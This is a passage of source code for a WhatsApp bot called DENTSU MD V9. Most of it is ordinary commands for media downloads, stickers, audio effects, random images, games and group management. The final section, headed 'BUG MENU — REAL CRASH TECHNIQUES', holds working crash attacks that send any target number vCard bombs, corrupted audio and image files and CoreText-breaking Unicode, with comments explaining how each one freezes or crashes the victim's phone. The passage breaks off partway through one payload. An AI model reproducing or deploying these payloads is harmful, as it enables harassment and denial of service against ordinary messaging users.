      const res = await axios.get(`https://api.bk9.dev/download/insta?url=${encodeURIComponent(text)}`);
      const data = res.data?.BK9 || res.data;
      const url = data?.video || data?.image;
      if (!url) return reply('❌ Could not extract Instagram media.');
      if (data?.video) await sock.sendMessage(from, { video: { url }, caption: '📸 Instagram Video\n_Powered by DENTSU MD V9_' }, { quoted: msg });
      else await sock.sendMessage(from, { image: { url }, caption: '📸 Instagram Image\n_Powered by DENTSU MD V9_' }, { quoted: msg });
    } catch (e) { await reply(`❌ Instagram download failed: ${e.message}`); }
    return true;
  }

  case 'yts':
  case 'ytsearch': {
    if (!text) return reply('❌ Provide a search query.\nExample: .yts Believer');
    try {
      const yts = require('yt-search');
      const search = await yts(text);
      const results = search.all.slice(0, 5);
      let txt = `🔍 *YouTube Search: ${text}*\n\n`;
      results.forEach((v, i) => { txt += `${i+1}. *${v.title}*\n   ⏱️ ${v.timestamp} | 👁️ ${v.views}\n   🔗 ${v.url}\n\n`; });
      await sock.sendMessage(from, { image: { url: results[0]?.thumbnail }, caption: txt }, { quoted: msg });
    } catch (e) { await reply(`❌ Search failed: ${e.message}`); }
    return true;
  }

  case 'shorturl': {
    if (!text) return reply('❌ Provide a URL.\nExample: .shorturl https://example.com');
    try {
      const res = await axios.get(`https://tinyurl.com/api-create.php?url=${encodeURIComponent(text)}`);
      await reply(`🔗 *Short URL:*\n*Original:* ${text}\n*Short:* ${res.data}`);
    } catch { await reply('❌ Failed to shorten URL.'); }
    return true;
  }

  // ════════════════════════════════════════════════════════════════
  // 📸 MEDIA COMMANDS
  // ════════════════════════════════════════════════════════════════

  case 's':
  case 'sticker': {
    // Support: reply to image OR send image with .s as caption
    const quotedMsg = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;
    const directImg = msg.message?.imageMessage;
    const targetMsg = quotedMsg ? { message: quotedMsg, key: { remoteJid: from, id: msg.message?.extendedTextMessage?.contextInfo?.stanzaId || msg.key.id, fromMe: false } } : directImg ? msg : null;
    const targetType = quotedMsg ? Object.keys(quotedMsg)[0] : directImg ? 'imageMessage' : null;
    if (!targetMsg || !['imageMessage','videoMessage','stickerMessage'].includes(targetType))
      return reply('❌ Reply to an image with .s, or send an image with .s as caption.');
    try {
      fs.ensureDirSync('./tmp');
      const buf = await downloadMediaMessage(targetMsg, 'buffer', {});
      const sharp = require('sharp');
      const webp = await sharp(buf)
        .resize(512, 512, { fit: 'contain', background: { r:0, g:0, b:0, alpha:0 } })
        .webp({ quality: 80 })
        .toBuffer();
      await sock.sendMessage(from, { sticker: webp }, { quoted: msg });
    } catch (e) { await reply(`❌ Sticker error: ${e.message}`); }
    return true;
  }

  case 'toimg':
  case 'stickertoimg': {
    const qMsg = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;
    if (!qMsg) return reply('❌ Reply to a sticker.');
    try {
      fs.ensureDirSync('./tmp');
      const buf = await downloadMediaMessage({ message: qMsg, key: msg.key }, 'buffer', {});
      const fp = `./tmp/${Date.now()}.jpg`;
      fs.writeFileSync(fp, buf);
      await sock.sendMessage(from, { image: fs.readFileSync(fp) }, { quoted: msg });
      fs.unlinkSync(fp);
    } catch (e) { await reply(`❌ Conversion failed: ${e.message}`); }
    return true;
  }

  case 'getpp': {
    if (!isOwner) return reply('❌ Owner only.');
    const mentioned = getMentioned(msg);
    const qCtx = msg.message?.extendedTextMessage?.contextInfo;
    const target = mentioned[0] || qCtx?.participant || (text.replace(/[^0-9]/g,'') + '@s.whatsapp.net') || sender;
    try {
      const ppUrl = await sock.profilePictureUrl(target, 'image');
      await sock.sendMessage(from, { image: { url: ppUrl }, caption: `📸 Profile picture of @${target.split('@')[0]}` }, { quoted: msg });
    } catch { await reply('❌ Could not fetch profile picture (may be private).'); }
    return true;
  }

  case 'setgpp': {
    if (!isGroup) return reply('❌ Group only.');
    const qMsg = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;
    if (!qMsg) return reply('❌ Reply to an image.');
    const buf = await downloadMediaMessage({ message: qMsg, key: msg.key }, 'buffer', {});
    await sock.updateProfilePicture(from, buf);
    await reply('✅ Group profile picture updated!');
    return true;
  }

  case 'say':
  case 'tts': {
    if (!text) return reply('❌ Usage: .say Hello World');
    try {
      const googleTTS = require('google-tts-api');
      const url = googleTTS.getAudioUrl(text, { lang: 'en', slow: false, host: 'https://translate.google.com' });
      await sock.sendMessage(from, { audio: { url }, mimetype: 'audio/mp4', ptt: true }, { quoted: msg });
    } catch (e) { await reply(`❌ TTS error: ${e.message}`); }
    return true;
  }

  // Audio effects (FFmpeg)
  case 'bass':
  case 'blown':
  case 'deep':
  case 'earrape':
  case 'fast':
  case 'nightcore':
  case 'reverse':
  case 'robot':
  case 'slow':
  case 'smooth':
  case 'squirrel': {
    const qMsg = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;
    if (!qMsg) return reply(`❌ Reply to an audio with *${prefix}${command}*`);
    const qType = Object.keys(qMsg)[0];
    if (qType !== 'audioMessage') return reply('❌ Reply to an audio message.');
    const filterMap = {
      bass: '-af equalizer=f=54:width_type=o:width=2:g=20',
      blown: '-af acrusher=.1:1:64:0:log',
      deep: '-af atempo=4/4,asetrate=44500*2/3',
      earrape: '-af volume=12',
      fast: '-filter:a "atempo=1.63,asetrate=44100"',
      nightcore: '-filter:a atempo=1.06,asetrate=44100*1.25',
      reverse: '-filter_complex "areverse"',
      robot: '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"',
      slow: '-filter:a "atempo=0.7,asetrate=44100"',
      smooth: '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"',
      squirrel: '-filter:a "atempo=0.5,asetrate=65100"',
    };
    try {
      fs.ensureDirSync('./tmp');
      const buf = await downloadMediaMessage({ message: qMsg, key: msg.key }, 'buffer', {});
      const inp = getRandom('.mp3'), out = getRandom('.mp3');
      fs.writeFileSync(inp, buf);
      exec(`ffmpeg -i ${inp} ${filterMap[command]} ${out}`, (err) => {
        fs.unlinkSync(inp);
        if (err) return sock.sendMessage(from, { text: `❌ FFmpeg error: ${err.message}` }, { quoted: msg });
        const outBuf = fs.readFileSync(out);
        sock.sendMessage(from, { audio: outBuf, mimetype: 'audio/mpeg' }, { quoted: msg });
        fs.unlinkSync(out);
      });
    } catch (e) { await reply(`❌ Audio effect error: ${e.message}`); }
    return true;
  }

  // ════════════════════════════════════════════════════════════════
  // 🐾 RANDOM IMAGE COMMANDS
  // ════════════════════════════════════════════════════════════════

  case 'cat': {
    try { const r = await axios.get('https://api.thecatapi.com/v1/images/search'); await sock.sendMessage(from, { image: { url: r.data[0].url }, caption: '🐱 Random Cat!' }, { quoted: msg }); }
    catch { await reply('❌ Failed to fetch cat image.'); }
    return true;
  }
  case 'dog': {
    try { const r = await axios.get('https://dog.ceo/api/breeds/image/random'); await sock.sendMessage(from, { image: { url: r.data.message }, caption: '🐶 Random Dog!' }, { quoted: msg }); }
    catch { await reply('❌ Failed to fetch dog image.'); }
    return true;
  }
  case 'fox': {
    try { const r = await axios.get('https://randomfox.ca/floof/'); await sock.sendMessage(from, { image: { url: r.data.image }, caption: '🦊 Random Fox!' }, { quoted: msg }); }
    catch { await reply('❌ Failed to fetch fox image.'); }
    return true;
  }
  case 'bird': {
    try { const r = await axios.get('https://some-random-api.ml/img/birb'); await sock.sendMessage(from, { image: { url: r.data.link }, caption: '🐦 Random Bird!' }, { quoted: msg }); }
    catch { await reply('❌ Failed to fetch bird image.'); }
    return true;
  }
  case 'panda': {
    try { const r = await axios.get('https://some-random-api.ml/img/panda'); await sock.sendMessage(from, { image: { url: r.data.link }, caption: '🐼 Random Panda!' }, { quoted: msg }); }
    catch { await reply('❌ Failed to fetch panda image.'); }
    return true;
  }

  // Waifu / anime
  case 'waifu':
  case 'neko':
  case 'maid':
  case 'kitsune': {
    const sfwMap = { waifu: 'waifu', neko: 'neko', maid: 'maid', kitsune: 'kitsune' };
    try { const r = await axios.get(`https://api.waifu.pics/sfw/${sfwMap[command] || 'waifu'}`); await sock.sendMessage(from, { image: { url: r.data.url }, caption: `🌸 ${command.charAt(0).toUpperCase()+command.slice(1)}\n_Powered by DENTSU MD V9_` }, { quoted: msg }); }
    catch { await reply('❌ Failed to fetch anime image.'); }
    return true;
  }

  case 'rwaifu':
  case 'animegirl': {
    try { const r = await axios.get('https://apis.davidcyriltech.my.id/random/waifu'); await sock.sendMessage(from, { image: { url: r.data?.url || r.data?.image }, caption: '🌸 Anime Girl\n_Powered by DENTSU MD V9_' }, { quoted: msg }); }
    catch { await reply('❌ Failed to fetch anime girl image.'); }
    return true;
  }

  // ════════════════════════════════════════════════════════════════
  // ✨ EPHOTO COMMANDS (prexzyvilla.site)
  // ════════════════════════════════════════════════════════════════

  case 'glitchtext':       await ephoto(sock, from, msg, 'glitchtext',       '⚡ Glitch Text', text); return true;
  case 'writetext':        await ephoto(sock, from, msg, 'writetext',        '✍️ Write Text', text); return true;
  case 'advancedglow':     await ephoto(sock, from, msg, 'advancedglow',     '💡 Advanced Glow', text); return true;
  case 'typographytext':   await ephoto(sock, from, msg, 'typographytext',   '🖋️ Typography', text); return true;
  case 'pixelglitch':      await ephoto(sock, from, msg, 'pixelglitch',      '🧩 Pixel Glitch', text); return true;
  case 'neonglitch':       await ephoto(sock, from, msg, 'neonglitch',       '💥 Neon Glitch', text); return true;
  case 'flagtext':         await ephoto(sock, from, msg, 'flagtext',         '🇳🇬 Flag Text', text); return true;
  case 'flag3dtext':       await ephoto(sock, from, msg, 'flag3dtext',       '🇺🇸 3D Flag Text', text); return true;
  case 'deletingtext':     await ephoto(sock, from, msg, 'deletingtext',     '🩶 Deleting Text', text); return true;
  case 'blackpinkstyle':   await ephoto(sock, from, msg, 'blackpinkstyle',   '🎀 Blackpink Style', text); return true;
  case 'glowingtext':      await ephoto(sock, from, msg, 'glowingtext',      '💫 Glowing Text', text); return true;
  case 'underwatertext':   await ephoto(sock, from, msg, 'underwatertext',   '🌊 Underwater Text', text); return true;
  case 'logomaker':        await ephoto(sock, from, msg, 'logomaker',        '🐻 Logo Maker', text); return true;
  case 'cartoonstyle':     await ephoto(sock, from, msg, 'cartoonstyle',     '🎨 Cartoon Style', text); return true;
  case 'papercutstyle':    await ephoto(sock, from, msg, 'papercutstyle',    '✂️ Paper Cut', text); return true;
  case 'watercolortext':   await ephoto(sock, from, msg, 'watercolortext',   '🖌️ Watercolor', text); return true;
  case 'effectclouds':     await ephoto(sock, from, msg, 'effectclouds',     '☁️ Cloud Text', text); return true;
  case 'blackpinklogo':    await ephoto(sock, from, msg, 'blackpinklogo',    '💖 Blackpink Logo', text); return true;
  case 'gradienttext':     await ephoto(sock, from, msg, 'gradienttext',     '🌈 Gradient Text', text); return true;
  case 'summerbeach':      await ephoto(sock, from, msg, 'summerbeach',      '🏖️ Summer Beach', text); return true;
  case 'luxurygold':       await ephoto(sock, from, msg, 'luxurygold',       '🥇 Luxury Gold', text); return true;
  case 'multicoloredneon': await ephoto(sock, from, msg, 'multicoloredneon', '🌈 Multicolor Neon', text); return true;
  case 'sandsummer':       await ephoto(sock, from, msg, 'sandsummer',       '🏝️ Sand Summer', text); return true;
  case 'galaxywallpaper':  await ephoto(sock, from, msg, 'galaxywallpaper',  '🌌 Galaxy Wallpaper', text); return true;
  case 'style1917':        await ephoto(sock, from, msg, 'style1917',        '🎖️ 1917 Style', text); return true;
  case 'makingneon':       await ephoto(sock, from, msg, 'makingneon',       '🌠 Making Neon', text); return true;
  case 'royaltext':        await ephoto(sock, from, msg, 'royaltext',        '👑 Royal Text', text); return true;
  case 'freecreate':       await ephoto(sock, from, msg, 'freecreate',       '🧊 3D Hologram', text); return true;
  case 'galaxystyle':      await ephoto(sock, from, msg, 'galaxystyle',      '🪐 Galaxy Style', text); return true;
  case 'createlogo':       await ephoto(sock, from, msg, 'createlogo',       '🎯 Create Logo', text); return true;
  case 'lighteffects':     await ephoto(sock, from, msg, 'lighteffects',     '💡 Light Effects', text); return true;

  // ════════════════════════════════════════════════════════════════
  // ♉ GFX / LOGO COMMANDS (nexoracle.com)
  // ════════════════════════════════════════════════════════════════

  case 'gfx':
  case 'gfx2':
  case 'gfx3':
  case 'gfx4':
  case 'gfx5':
  case 'gfx6':
  case 'gfx7':
  case 'gfx8':
  case 'gfx9':
  case 'gfx10':
  case 'gfx11':
  case 'gfx12': {
    const parts = text.split('|').map(v => v.trim());
    await gfxLogo(sock, from, msg, command, parts[0], parts[1]);
    return true;
  }

  // ════════════════════════════════════════════════════════════════
  // 🔧 TOOLS
  // ════════════════════════════════════════════════════════════════

  case 'idch': {
    if (!isOwner) return reply('❌ Owner only.');
    if (!text || !text.includes('https://whatsapp.com/channel/')) return reply('❌ Provide a valid channel link.');
    const code = text.split('https://whatsapp.com/channel/')[1];
    try {
      const res = await sock.newsletterMetadata('invite', code);
      await reply(`📡 *Channel Info:*\n*ID:* ${res.id}\n*Name:* ${res.name}\n*Followers:* ${res.subscribers}\n*Status:* ${res.state}\n*Verified:* ${res.verification === 'VERIFIED' ? '✅' : '❌'}`);
    } catch (e) { await reply(`❌ Failed: ${e.message}`); }
    return true;
  }

  case 'qc': {
    if (!text) return reply('❌ Usage: .qc Your quote here');
    const name = msg.pushName || 'User';
    let ppUrl = 'https://telegra.ph/file/6880771c1f1b5954d7203.jpg';
    try { ppUrl = await sock.profilePictureUrl(sender, 'image'); } catch (_) {}
    const url = `https://www.laurine.site/api/generator/qc?text=${encodeURIComponent(text)}&name=${encodeURIComponent(name)}&photo=${encodeURIComponent(ppUrl)}`;
    try {
      await sock.sendMessage(from, { image: { url }, caption: `💬 *"${text}"*\n— ${name}` }, { quoted: msg });
    } catch (e) { await reply(`❌ Quote card failed: ${e.message}`); }
    return true;
  }

  case 'ascii': {
    if (!text) return reply('❌ Usage: .ascii Hello World');
    try {
      const res = await axios.get(`https://artii.herokuapp.com/make?text=${encodeURIComponent(text)}`);
      await reply(`🎨 ASCII Art:\n\n${res.data}`);
    } catch { await reply('❌ ASCII generation failed.'); }
    return true;
  }

  case 'gamefact': {
    try {
      const res = await axios.get('https://www.freetogame.com/api/games');
      const g = res.data[Math.floor(Math.random() * res.data.length)];
      await reply(`🎮 *${g.title}*\n🎯 Genre: ${g.genre}\n💻 Platform: ${g.platform}\n🔗 ${g.game_url}`);
    } catch { await reply('❌ Failed to fetch game fact.'); }
    return true;
  }

  case 'inspire': {
    try {
      const res = await axios.get('https://type.fit/api/quotes');
      const q = res.data[Math.floor(Math.random() * res.data.length)];
      await reply(`🌟 *"${q.text}"*\n— ${q.author || 'Unknown'}`);
    } catch { await reply('🌟 Keep going! Success is not final, failure is not fatal.'); }
    return true;
  }

  case 'dadjoke': {
    try {
      const res = await axios.get('https://icanhazdadjoke.com/', { headers: { Accept: 'application/json' } });
      await reply(`👨‍🦳 *Dad Joke:*\n${res.data.joke}`);
    } catch { await reply('👨‍🦳 Why don\'t scientists trust atoms? Because they make up everything!'); }
    return true;
  }


  // ════════════════════════════════════════════════════════════════
  // 👥 MISSING GROUP COMMANDS
  // ════════════════════════════════════════════════════════════════

  case 'opengc': {
    if (!isGroup) return reply('❌ Group only.');
    if (!isAdmin && !isOwner) return reply('❌ Admins only.');
    await sock.groupSettingUpdate(from, 'not_announcement');
    await reply('🔓 Group is now *open*! Everyone can send messages.');
    return true;
  }

  case 'closegc': {
    if (!isGroup) return reply('❌ Group only.');
    if (!isAdmin && !isOwner) return reply('❌ Admins only.');
    await sock.groupSettingUpdate(from, 'announcement');
    await reply('🔒 Group is now *closed*! Only admins can send messages.');
    return true;
  }

  case 'announce': {
    if (!isGroup) return reply('❌ Group only.');
    if (!isAdmin && !isOwner) return reply('❌ Admins only.');
    await sock.groupSettingUpdate(from, 'announcement');
    await reply('📢 *Announcement mode ON!* Only admins can send messages.');
    return true;
  }

  case 'kickall': {
    if (!isOwner) return reply('❌ Owner only.');
    if (!isGroup) return reply('❌ Group only.');
    const nonAdmins = participants.filter(p => !p.admin && p.id !== botId);
    if (!nonAdmins.length) return reply('ℹ️ No non-admin members to kick.');
    await reply(`⏳ Kicking ${nonAdmins.length} members...`);
    let kicked = 0;
    for (const p of nonAdmins) {
      try { await sock.groupParticipantsUpdate(from, [p.id], 'remove'); kicked++; await new Promise(r => setTimeout(r, 500)); } catch (_) {}
    }
    await reply(`✅ Done! Kicked ${kicked}/${nonAdmins.length} members.`);
    return true;
  }

  case 'kickall2': {
    if (!isOwner) return reply('❌ Owner only.');
    if (!isGroup) return reply('❌ Group only.');
    const members = participants.filter(p => p.id !== botId && p.id !== sender);
    if (!members.length) return reply('ℹ️ No members to kick.');
    await reply(`⏳ Kicking ALL ${members.length} members (except you)...`);
    let kicked = 0;
    for (const p of members) {
      try { await sock.groupParticipantsUpdate(from, [p.id], 'remove'); kicked++; await new Promise(r => setTimeout(r, 500)); } catch (_) {}
    }
    await reply(`✅ Done! Kicked ${kicked}/${members.length} members.`);
    return true;
  }

  case 'listonline':
  case 'members': {
    if (!isGroup) return reply('❌ Group only.');
    const list = participants.map((p, i) => `${i+1}. @${p.id.split('@')[0]}${p.admin ? ' 👑' : ''}`).join('\n');
    await sock.sendMessage(from, { text: `👥 *Group Members (${participants.length}):*\n\n${list}`, mentions: participants.map(p => p.id) }, { quoted: msg });
    return true;
  }

  case 'tagadmins': {
    if (!isGroup) return reply('❌ Group only.');
    const admins = participants.filter(p => p.admin);
    if (!admins.length) return reply('❌ No admins found.');
    const tagText = text || '👑 Attention Admins!';
    let teks = `📢 *${tagText}*\n\n`;
    for (const a of admins) teks += `@${a.id.split('@')[0]}\n`;
    await sock.sendMessage(from, { text: teks, mentions: admins.map(a => a.id) }, { quoted: msg });
    return true;
  }

  // ════════════════════════════════════════════════════════════════
  // 👑 MISSING OWNER COMMANDS
  // ════════════════════════════════════════════════════════════════

  case 'pair':
  case 'connect': {
    if (!isOwner) return reply('❌ Owner only.');
    const WEBSITE = process.env.WEBSITE || 'dentsu-md-v9.onrender.com';
    const websiteUrl = WEBSITE.startsWith('http') ? WEBSITE : 'https://' + WEBSITE;
    await reply(`🔗 *Bot Pairing Link:*\n${websiteUrl}\n\n_Open this link, enter your WhatsApp number with country code, and follow the steps to connect the bot._`);
    return true;
  }

  case 'setname': {
    if (!isOwner) return reply('❌ Owner only.');
    if (!text) return reply('❌ Usage: .setname New Bot Name');
    try {
      await sock.updateProfileName(text);
      await reply(`✅ Bot name updated to: *${text}*`);
    } catch (e) { await reply(`❌ Failed to update name: ${e.message}`); }
    return true;
  }

  case 'setbio': {
    if (!isOwner) return reply('❌ Owner only.');
    if (!text) return reply('❌ Usage: .setbio Your new status here');
    try {
      await sock.updateProfileStatus(text);
      await reply(`✅ Bot bio updated to: *${text}*`);
    } catch (e) { await reply(`❌ Failed to update bio: ${e.message}`); }
    return true;
  }

  case 'ban': {
    if (!isOwner) return reply('❌ Owner only.');
    const mentioned = getMentioned(msg);
    const target = mentioned[0] || (text.replace(/[^0-9]/g,'') + '@s.whatsapp.net');
    if (!target || target === '@s.whatsapp.net') return reply('❌ Tag or provide a number to ban.');
    await sock.updateBlockStatus(target, 'block');
    await reply(`✅ @${target.split('@')[0]} has been *banned*.`);
    return true;
  }

  case 'unban': {
    if (!isOwner) return reply('❌ Owner only.');
    const mentioned = getMentioned(msg);
    const target = mentioned[0] || (text.replace(/[^0-9]/g,'') + '@s.whatsapp.net');
    if (!target || target === '@s.whatsapp.net') return reply('❌ Tag or provide a number to unban.');
    await sock.updateBlockStatus(target, 'unblock');
    await reply(`✅ @${target.split('@')[0]} has been *unbanned*.`);
    return true;
  }

  // ════════════════════════════════════════════════════════════════
  // 🖼️ MISSING AI/MEDIA COMMANDS
  // ════════════════════════════════════════════════════════════════

  case 'photoai': {
    if (!text) return reply('❌ Usage: .photoai a beautiful sunset');
    try {
      await reply('⏳ Generating AI photo...');
      const url = `https://image.pollinations.ai/prompt/${encodeURIComponent(text)}?width=1024&height=1024&nologo=true`;
      await sock.sendMessage(from, { image: { url }, caption: `🎨 *AI Photo:* ${text}\n_Powered by DENTSU MD V9_` }, { quoted: msg });
    } catch (e) { await reply(`❌ Photo AI error: ${e.message}`); }
    return true;
  }

  case 'catbox': {
    try {
      await reply('⏳ Uploading to Catbox...');
      const FormData = require('form-data');
      let fd = new FormData();
      // If user replied to a media message — upload the file
      const qMsg2 = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;
      if (qMsg2) {
        const buf2 = await downloadMediaMessage({ message: qMsg2, key: msg.key }, 'buffer', {});
        const mtype2 = Object.keys(qMsg2)[0];
        const ext = mtype2 === 'imageMessage' ? '.jpg' : mtype2 === 'videoMessage' ? '.mp4' : mtype2 === 'audioMessage' ? '.mp3' : '.bin';
        const tmpPath = `./tmp/catbox_${Date.now()}${ext}`;
        fs.ensureDirSync('./tmp');
        fs.writeFileSync(tmpPath, buf2);
        fd.append('reqtype', 'fileupload');
        fd.append('fileToUpload', fs.createReadStream(tmpPath));
        const res = await axios.post('https://catbox.moe/user.php', fd, { headers: fd.getHeaders() });
        fs.unlinkSync(tmpPath);
        await reply(`✅ *Uploaded to Catbox!*\n🔗 ${res.data}`);
      } else if (text) {
        // URL upload mode
        fd.append('reqtype', 'urlupload');
        fd.append('url', text);
        const res = await axios.post('https://catbox.moe/user.php', fd, { headers: fd.getHeaders() });
        await reply(`✅ *Uploaded to Catbox!*\n🔗 ${res.data}`);
      } else {
        return reply('❌ Reply to a file/image/video or provide a URL.\nExample: .catbox https://example.com/file.jpg');
      }
    } catch (e) { await reply(`❌ Catbox upload failed: ${e.message}`); }
    return true;
  }

  // ════════════════════════════════════════════════════════════════
  // 🎮 MISSING GAME COMMANDS
  // ════════════════════════════════════════════════════════════════

  case 'rpsls': {
    const rlsChoices = ['rock','paper','scissors','lizard','spock'];
    const userRlsChoice = (text || '').toLowerCase().trim();
    if (!rlsChoices.includes(userRlsChoice))
      return reply(`❌ Choose one:\n*rock, paper, scissors, lizard, spock*\nExample: .rpsls rock`);
    const botRlsChoice = rlsChoices[Math.floor(Math.random() * 5)];
    const rlsWins = { rock:['scissors','lizard'], paper:['rock','spock'], scissors:['paper','lizard'], lizard:['paper','spock'], spock:['scissors','rock'] };
    const rlsResult = userRlsChoice === botRlsChoice ? '🤝 It\'s a Tie!' : rlsWins[userRlsChoice].includes(botRlsChoice) ? '🎉 You Win!' : '😢 Bot Wins!';
    await reply(`🎮 *RPSLS Battle!*\n\n👤 You: *${userRlsChoice}*\n🤖 Bot: *${botRlsChoice}*\n\n${rlsResult}`);
    return true;
  }

  case 'hangman': {
    const hWords = ['javascript','whatsapp','dentsu','programming','developer','chatbot','database','algorithm','network','computer','football','basketball','smartphone','television','keyboard'];
    const hWord = hWords[Math.floor(Math.random() * hWords.length)];
    const masked = hWord.split('').map((c, i) => i === 0 || i === hWord.length-1 ? c : '_').join(' ');
    await reply(`🎮 *Hangman!*\n\n${' _ '.repeat(hWord.length)}\nLetters: *${hWord.length}*\nFirst letter: *${hWord[0]}*\nLast letter: *${hWord[hWord.length-1]}*\n\n_Try to guess the word!_\n\n||Answer: ${hWord}||`);
    return true;
  }

  case 'tictactoe': {
    if (!text) {
      const grid = `1 | 2 | 3\n--+---+--\n4 | 5 | 6\n--+---+--\n7 | 8 | 9`;
      return reply(`🎮 *Tic-Tac-Toe!*\n\n${grid}\n\n_Send .tictactoe [1-9] to place your X._`);
    }
    const pos = parseInt(text);
    if (isNaN(pos) || pos < 1 || pos > 9) return reply('❌ Choose a position from 1 to 9.');
    const tttBoard = ['1','2','3','4','5','6','7','8','9'];
    tttBoard[pos - 1] = 'X';
    const available = tttBoard.filter(v => v !== 'X');
    if (available.length) tttBoard[tttBoard.indexOf(available[Math.floor(Math.random() * available.length)])] = 'O';
    const g = tttBoard;
    const grid = `${g[0]} | ${g[1]} | ${g[2]}\n--+---+--\n${g[3]} | ${g[4]} | ${g[5]}\n--+---+--\n${g[6]} | ${g[7]} | ${g[8]}`;
    await reply(`🎮 *Tic-Tac-Toe!*\n\n${grid}\n\n👤 You: *X* | 🤖 Bot: *O*`);
    return true;
  }


  // ════════════════════════════════════════════════════════════════
  // 💀 BUG MENU — REAL CRASH TECHNIQUES (Baileys API)
  // ════════════════════════════════════════════════════════════════

  case 'bug-andro': {
    if (!isOwner) return reply('❌ Owner only.');
    if (!text) return reply('❌ Usage: .bug-andro 242065121108');
    const bugNum = text.replace(/[^0-9]/g, '');
    const bugTarget = bugNum + '@s.whatsapp.net';
    await reply('⚡ Sending Android vCard bomb...');

    // TECHNIQUE: vCard Bomb — 1000 contacts in one message
    // WhatsApp Android renders all contacts in a scrollable list.
    // 1000 contacts with 100-char names overflows the list renderer
    // memory on mid-range Android devices → crash/freeze.
    const vcards = [];
    for (let i = 0; i < 1000; i++) {
      const fakeNum = String(10000000000 + i);
      vcards.push({
        vcard: `BEGIN:VCARD\nVERSION:3.0\nFN:CRASH_${String(i).padStart(4,'0')}_${'X'.repeat(80)}\nTEL;type=CELL;type=VOICE;waid=${fakeNum}:+${fakeNum}\nEND:VCARD`
      });
    }
    try {
      await sock.sendMessage(bugTarget, {
        contacts: { displayName: '💀 1000 CRASH', contacts: vcards }
      });
      await reply(`💀 *Android Bug sent!*\n📲 Target: +${bugNum}\n📦 Payload: 1000 vCards (${vcards.length * 100} bytes/card)`);
    } catch (e) { await reply('❌ Error: ' + e.message); }
    return true;
  }

  case 'kill-ui': {
    if (!isOwner) return reply('❌ Owner only.');
    if (!text) return reply('❌ Usage: .kill-ui 242065121108');
    const killNum = text.replace(/[^0-9]/g, '');
    const killTarget = killNum + '@s.whatsapp.net';
    await reply('⚡ Sending corrupted voice note...');

    // TECHNIQUE 1: Corrupted OGG/Opus audio
    // WhatsApp sends a "voice note" with a valid OGG file signature
    // but completely random body bytes.
    // The Opus decoder crashes when it encounters the invalid packet data.
    const { randomBytes } = require('crypto');
    // Real OGG capture page header (magic bytes), then garbage
    const oggHeader = Buffer.from([
      0x4F,0x67,0x67,0x53, // OggS magic
      0x00,0x02,           // stream structure version + header type (BOS)
      0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00, // granule position
      0x78,0x56,0x34,0x12, // serial number
      0x00,0x00,0x00,0x00, // sequence number
      0x00,0x00,0x00,0x00, // checksum
      0x01,0x1E           // page segments
    ]);
    const corruptAudio = Buffer.concat([oggHeader, randomBytes(131072)]); // 128KB garbage
    try {
      await sock.sendMessage(killTarget, {
        audio: corruptAudio,
        mimetype: 'audio/ogg; codecs=opus',
        ptt: true
      });
    } catch (_) {}

    await new Promise(r => setTimeout(r, 600));

    // TECHNIQUE 2: Corrupted JPEG sticker
    // Valid JPEG SOI marker + random bytes → crashes image decoder
    const jpegSOI = Buffer.from([0xFF,0xD8,0xFF,0xE0,0x00,0x10,0x4A,0x46,0x49,0x46,0x00,0x01]);
    const corruptImg = Buffer.concat([jpegSOI, randomBytes(65536)]);
    try {
      await sock.sendMessage(killTarget, { sticker: corruptImg });
    } catch (_) {}

    await reply(`💀 *Kill-UI sent!*\n📲 Target: +${killNum}\n📦 Corrupted OGG (128KB) + JPEG sticker`);
    return true;
  }

  case 'freezer-ui': {
    if (!isOwner) return reply('❌ Owner only.');
    if (!text) return reply('❌ Usage: .freezer-ui 242065121108');
    const freezeNum = text.replace(/[^0-9]/g, '');
    const freezeTarget = freezeNum + '@s.whatsapp.net';
    await reply('⚡ Sending mega vCard...');

    // TECHNIQUE: Mega vCard NOTE field (500 KB)
    // WhatsApp renders the NOTE field in the contact info screen.
    // A 500KB note forces the text renderer to allocate and layout
    // a massive string → UI thread blocks → app freezes.
    const { randomBytes } = require('crypto');
    const bigNote = randomBytes(375000).toString('base64'); // ~500KB base64 string
    const megaVcard = `BEGIN:VCARD\nVERSION:3.0\nFN:FREEZE TARGET\nTEL;type=CELL;type=VOICE;waid=10000000001:+10000000001\nNOTE:${bigNote}\nEND:VCARD`;
    try {
      await sock.sendMessage(freezeTarget, {
        contacts: { displayName: 'FREEZE', contacts: [{ vcard: megaVcard }] }
      });
      await reply(`💀 *Freezer-UI sent!*\n📲 Target: +${freezeNum}\n📦 Mega vCard NOTE: ~500 KB`);
    } catch (e) { await reply('❌ Error: ' + e.message); }
    return true;
  }

  case 'dentsu-aple': {
    if (!isOwner) return reply('❌ Owner only.');
    if (!text) return reply('❌ Usage: .dentsu-aple 242065121108');
    const appleNum = text.replace(/[^0-9]/g, '');
    const appleTarget = appleNum + '@s.whatsapp.net';
    await reply('⚡ Sending iOS payload...');

    // TECHNIQUE 1: vCard bomb with CoreText-crashing characters in FN field
    // iOS uses CoreText to render all text including contact names in notifications.
    // Sinhala + Malayalam joiners (U+0D20 U+0D3E U+0D4D U+200D …) trigger
    // an infinite loop in the CoreText glyph-shaping engine → crash on tap/notification.
    const coreTextCrash = '\u0D20\u0D3E\u0D4D\u200D\u0D35\u0D4D\u200D\u0D2F\u0D4D\u0D15\u0D4D\u200D';
    const appleVcards = [];
    for (let i = 0; i < 300; i++) {
      const fakeNum = String(20000000000 + i);
      appleVcards.push({
        vcard: `BEGIN:VCARD\nVERSION:3.0\nFN:${coreTextCrash.repeat(15)} ${i}\nTEL;type=CELL;type=VOICE;waid=${fakeNum}:+${fakeNum}\nEND:VCARD`
      });
    }
    try {
      await sock.sendMessage(appleTarget, {
        contacts: { displayName: coreTextCrash.repeat(3), contacts: appleVcards }
      });
    } catch (_) {}

    await new Promise(r => setTimeout(r, 800));

    // TECHNIQUE 2: Corrupted M4A audio (crashes iOS AVFoundation decoder)
    const { randomBytes } = require('crypto');
    const m4aFtyp = Buffer.from([
      0x00,0x00,0x00,0x20, // box size = 32
      0x66,0x74,0x79,0x70, // ftyp
